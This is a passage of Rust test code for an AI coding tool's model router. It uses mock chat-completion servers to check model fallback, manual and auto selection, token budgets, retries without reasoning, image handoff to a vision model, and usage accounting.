    use crate::events::RecordingEmitter;
    use wiremock::matchers::{method, path};
    use wiremock::{Mock, MockServer, Request, ResponseTemplate};

    const SUPER: &str = "nvidia/nemotron-3-super-120b-a12b";
    const CODER: &str = "qwen/qwen3-coder-480b-a35b-instruct";
    const VISION_M: &str = "meta/llama-3.2-90b-vision-instruct";

    /// SSE reply: optional reasoning, content, finish reason and a usage chunk.
    fn reply(reasoning: &str, content: &str, finish: &str) -> ResponseTemplate {
        let mut s = String::new();
        if !reasoning.is_empty() {
            s.push_str(&format!("data: {}\n\n", json!({"choices":[{"index":0,"delta":{"reasoning_content":reasoning},"finish_reason":null}]})));
        }
        if !content.is_empty() {
            s.push_str(&format!("data: {}\n\n", json!({"choices":[{"index":0,"delta":{"content":content},"finish_reason":null}]})));
        }
        s.push_str(&format!("data: {}\n\n", json!({"choices":[{"index":0,"delta":{},"finish_reason":finish}]})));
        s.push_str(&format!("data: {}\n\n", json!({"choices":[],"usage":{"prompt_tokens":10,"completion_tokens":5,"total_tokens":15}})));
        s.push_str("data: [DONE]\n\n");
        ResponseTemplate::new(200).set_body_raw(s, "text/event-stream")
    }

    struct Routed {
        _tmp: tempfile::TempDir,
        g: Arc<Genius>,
        pid: String,
        server: MockServer,
        rec: Arc<RecordingEmitter>,
    }

    impl Routed {
        async fn bodies(&self) -> Vec<Value> {
            self.server.received_requests().await.unwrap().iter().filter(|r| r.url.path().ends_with("/chat/completions")).map(|r| serde_json::from_slice(&r.body).unwrap()).collect()
        }
        fn titles(&self) -> Vec<String> {
            self.g.bus.list(Some(&self.pid), 500).unwrap().into_iter().map(|e| e.title).collect()
        }
    }

    async fn routed(models: &[&str], manual: Option<&str>, respond: impl Fn(&Value) -> ResponseTemplate + Send + Sync + 'static) -> Routed {
        let server = MockServer::start().await;
        Mock::given(method("POST"))
            .and(path("/v1/chat/completions"))
            .respond_with(move |req: &Request| respond(&serde_json::from_slice(&req.body).unwrap()))
            .mount(&server)
            .await;
        let tmp = tempfile::tempdir().unwrap();
        let rec = Arc::new(RecordingEmitter::default());
        let g = Genius::new(&tmp.path().join("data"), rec.clone(), Arc::new(crate::secrets::MemoryStore::default())).unwrap();
        let mut s = g.settings().unwrap();
        s.base_url = format!("http://127.0.0.1:{}/v1", server.address().port());
        s.workspace_dir = Some(tmp.path().join("projects").to_string_lossy().to_string());
        if let Some(m) = manual {
            s.model_mode = "manual".into();
            s.model = Some(m.into());
        }
        g.save_settings(&s).unwrap();
        g.save_api_key("nvapi-router-test-key-0123456789").unwrap();
        let list: Vec<ModelInfo> = models.iter().map(|id| ModelInfo { id: id.to_string(), owner: None, created: None, inferred_category: crate::nvidia::infer_category(id).into() }).collect();
        g.db.put_model_cache(&s.base_url, &serde_json::to_value(list).unwrap()).unwrap();
        let pid = g.create_project("Routing", "").unwrap().id;
        Routed { _tmp: tmp, g, pid, server, rec }
    }

    async fn call(r: &Routed, opts: CallOptions, messages: &[ChatMessage]) -> Result<ChatResult> {
        r.g.ai_call_opts(&r.pid, "task-1", "Testing", messages, false, &CancellationToken::new(), &opts).await.map(|(c, _)| c)
    }

    #[tokio::test]
    async fn auto_mode_picks_the_best_model_and_falls_back() {
        let r = routed(&[SUPER, CODER, "meta/llama-3.3-70b-instruct"], None, |b| {
            if b["model"] == SUPER {
                ResponseTemplate::new(404).set_body_string(r#"{"detail":"Function not found for account"}"#)
            } else {
                reply("", "from the coder", "stop")
            }
        })
        .await;
        assert_eq!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap()[0], SUPER);
        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
        assert_eq!(res.model, CODER);
        assert_eq!(res.content, "from the coder");
        let models: Vec<Value> = r.bodies().await.iter().map(|b| b["model"].clone()).collect();
        assert_eq!(models, vec![json!(SUPER), json!(CODER)]);
        assert!(r.titles().iter().any(|t| t.starts_with(&format!("Switched to {CODER} because {SUPER}"))), "{:?}", r.titles());
        // remembered for the session: the unavailable model is skipped next time
        assert_eq!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap()[0], CODER);
        call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("again")]).await.unwrap();
        assert_eq!(r.bodies().await.len(), 3);
        // usage per task and per project
        let u = r.g.task_usage("task-1");
        assert_eq!(u["calls"], 2);
        assert_eq!(u["totalTokens"], 30);
        assert_eq!(u["models"], json!([CODER]));
        let sum = r.g.usage_summary(&r.pid).unwrap();
        assert_eq!(sum["totalTokens"], 30);
        assert_eq!(sum["promptTokens"], 20);
        assert_eq!(sum["calls"], 2);
        assert_eq!(sum["byModel"][CODER], 30);
    }

    #[tokio::test]
    async fn empty_reply_and_server_errors_fall_back() {
        let r = routed(&[SUPER, CODER, "moonshotai/kimi-k2-instruct"], None, |b| match b["model"].as_str().unwrap() {
            SUPER => reply("", "", "stop"),
            CODER => ResponseTemplate::new(500).set_body_string("boom"),
            _ => reply("", "kimi answers", "stop"),
        })
        .await;
        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
        assert_eq!(res.model, "moonshotai/kimi-k2-instruct");
        let t = r.titles();
        assert!(t.iter().any(|t| t.contains("returned an empty reply")) && t.iter().any(|t| t.contains("HTTP 500")), "{t:?}");
        assert!(!r.g.failed_models.lock().unwrap().contains(SUPER), "only unavailable models are remembered");
    }

    #[tokio::test]
    async fn manual_mode_uses_the_chosen_model_and_only_falls_back_when_unavailable() {
        let r = routed(&[SUPER, CODER], Some("meta/llama-3.3-70b-instruct"), |b| {
            if b["model"] == "meta/llama-3.3-70b-instruct" {
                ResponseTemplate::new(429).insert_header("retry-after", "0").set_body_string(r#"{"detail":"slow down"}"#)
            } else {
                reply("", "ok", "stop")
            }
        })
        .await;
        let chain = r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap();
        assert_eq!(chain[0], "meta/llama-3.3-70b-instruct");
        assert!(r.g.has_usable_model().is_ok());
        let err = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap_err();
        assert_eq!(err.kind(), "provider_rate_limited", "a rate limit is not a reason to switch the user's model");
        assert!(r.bodies().await.iter().all(|b| b["model"] == "meta/llama-3.3-70b-instruct"));

        let r = routed(&[SUPER, CODER], Some("gone/model"), |b| if b["model"] == "gone/model" { ResponseTemplate::new(404).set_body_string("{}") } else { reply("", "ok", "stop") }).await;
        assert_eq!(call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap().model, SUPER);

        let mut s = r.g.settings().unwrap();
        s.model = None;
        r.g.save_settings(&s).unwrap();
        assert_eq!(r.g.has_usable_model().unwrap_err().kind(), "provider_no_model");
    }

    #[tokio::test]
    async fn auto_mode_without_models_falls_back_to_the_selected_model() {
        let r = routed(&[], None, |_| reply("", "ok", "stop")).await;
        assert!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.is_err(), "nothing to use");
        let mut s = r.g.settings().unwrap();
        s.model = Some("custom/self-hosted".into());
        r.g.save_settings(&s).unwrap();
        assert_eq!(r.g.resolve_models(ModelRole::Agent, Effort::Max).await.unwrap(), vec!["custom/self-hosted"]);
        assert!(r.g.resolve_models(ModelRole::Vision, Effort::Max).await.unwrap().is_empty());
        r.g.secrets.delete(NVIDIA_KEY).unwrap();
        assert_eq!(r.g.has_usable_model().unwrap_err().kind(), "provider_missing_key");
    }

    #[tokio::test]
    async fn effort_sets_budget_thinking_and_quick_models() {
        let r = routed(&[SUPER, "nvidia/nemotron-3-nano-30b-a3b", "openai/gpt-oss-20b"], None, |_| reply("", "ok", "stop")).await;
        call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
        call(&r, CallOptions { role: Some(ModelRole::Quick), effort: Some(Effort::Balanced), ..Default::default() }, &[ChatMessage::user("commit msg")]).await.unwrap();
        call(&r, CallOptions { role: Some(ModelRole::Agent), effort: Some(Effort::Fast), ..Default::default() }, &[ChatMessage::user("hi")]).await.unwrap();
        let b = r.bodies().await;
        assert_eq!(b[0]["model"], SUPER);
        assert_eq!(b[0]["max_tokens"], 32768);
        assert_eq!(b[0]["chat_template_kwargs"]["enable_thinking"], true);
        assert_ne!(b[1]["model"], SUPER, "quick jobs use a fast model");
        assert!(b[1]["max_tokens"].as_u64().unwrap() <= 4096);
        assert_eq!(b[2]["max_tokens"], 8192);
        assert!(b[2]["chat_template_kwargs"]["enable_thinking"] == false || b[2]["reasoning_effort"] == "low", "{}", b[2]);
        let (t, think) = effort_budget(Effort::Max, ModelRole::Agent, &Settings { max_tokens: 4096, ..Default::default() });
        assert_eq!((t, think), (16384, true), "never more than 4x the max-tokens setting");
    }

    #[tokio::test]
    async fn length_with_only_reasoning_retries_without_thinking() {
        let r = routed(&[SUPER], None, |b| {
            if b["chat_template_kwargs"]["enable_thinking"] == true {
                reply("thinking forever", "", "length")
            } else {
                reply("", "the answer", "stop")
            }
        })
        .await;
        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
        assert_eq!(res.content, "the answer");
        assert_eq!(res.model, SUPER);
        let b = r.bodies().await;
        assert_eq!(b.len(), 2);
        assert_eq!(b[1]["chat_template_kwargs"]["enable_thinking"], false);
        assert!(r.titles().iter().any(|t| t.contains("whole output budget thinking")));
        // the reasoning was streamed live on its own channel
        let thinking: String = r.rec.on(channels::AI_THINKING).iter().map(|v| v["text"].as_str().unwrap_or("").to_string()).collect();
        assert_eq!(thinking, "thinking forever");
        assert_eq!(r.rec.on(channels::AI_THINKING)[0]["taskId"], "task-1");
    }

    #[tokio::test]
    async fn images_are_handed_to_a_vision_model_for_text_only_models() {
        let r = routed(&[SUPER, VISION_M], None, |b| {
            let has_image = b["messages"].as_array().unwrap().iter().any(|m| m["content"].is_array());
            if b["model"] == VISION_M {
                assert!(has_image, "the vision model receives the image");
                reply("", "- blue header with a logo\n- three cards", "stop")
            } else {
                assert!(!has_image, "the text model never receives image parts");
                reply("", "rebuilt", "stop")
            }
        })
        .await;
        let msg = ChatMessage { role: "user".into(), content: "Rebuild this".into(), images: vec!["data:image/png;base64,AAAA".into()] };
        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::system("sys"), msg]).await.unwrap();
        assert_eq!(res.model, SUPER);
        let b = r.bodies().await;
        assert_eq!(b.len(), 2);
        let text = b[1]["messages"][1]["content"].as_str().unwrap();
        assert!(text.starts_with("Rebuild this") && text.contains("blue header with a logo") && text.contains(VISION_M), "{text}");
        assert!(r.g.attachments_for_message(&r.pid, &[]).await.is_ok());

        let r = routed(&[SUPER], None, |_| reply("", "x", "stop")).await;
        let msg = ChatMessage { role: "user".into(), content: "see".into(), images: vec!["data:image/png;base64,AAAA".into()] };
        assert_eq!(call(&r, CallOptions::role(ModelRole::Agent), &[msg]).await.unwrap_err().kind(), "validation");
    }

    #[tokio::test]
    async fn resolved_models_lists_every_role() {
        let r = routed(&[SUPER, CODER, VISION_M, "openai/gpt-oss-20b"], None, |_| reply("", "ok", "stop")).await;
        let v = r.g.resolved_models().await.unwrap();
        for role in ["agent", "code", "plan", "subagent", "quick", "vision"] {
            assert!(v[role].is_array(), "{role}");
        }
        assert_eq!(v["agent"][0], SUPER);
        assert_eq!(v["vision"], json!([VISION_M]));
        // the self-model describes auto mode and the vision handoff truthfully
        let rep = r.g.capability_report_quick(None).unwrap();
        assert_eq!(rep.provider["modelMode"], "auto");
        assert_eq!(rep.provider["model"], SUPER);
        let get = |id: &str| rep.capabilities.iter().find(|c| c.id == id).unwrap().clone();
        assert!(get("chat").evidence.contains("Auto mode (effort: max)"), "{}", get("chat").evidence);
        assert_eq!(get("vision").status, "available");
        assert!(get("vision").evidence.contains(VISION_M));
    }
}
